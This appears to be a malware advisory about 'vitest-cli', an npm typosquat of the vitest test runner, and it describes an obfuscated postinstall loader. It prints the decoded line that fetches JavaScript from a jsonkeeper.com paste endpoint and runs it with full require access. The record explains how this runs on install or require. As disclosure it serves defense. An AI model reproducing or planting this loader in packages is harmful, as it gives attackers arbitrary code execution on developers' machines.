summary: vitest typosquat with obfuscated remote code loader fetching payload from jsonkeeper.com
details: Package name 'vitest-cli' impersonates the popular 'vitest' test runner, with empty author/repository/homepage metadata. lib/postinstall/index.js contains an obfuscated (p,a,c,k,e,d-encoded) snippet that is eval'd to perform: require('axios').get('https://jsonkeeper.com/external/W33XO').then(r => new Function('require', r.data.cookie)(require)). The fetched 'cookie' field from the anonymous JSON-paste host is executed as arbitrary JavaScript with full require access, and the loader retries 3 times with 10-minute backoffs. The package wires this via scripts.postinstall=node scripts/postinstall.js, and the same Postinstall() function is reachable through lib/index.js (the package main), so installing or requiring this package executes attacker-controlled JavaScript fetched from a mutable, anonymous paste endpoint.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
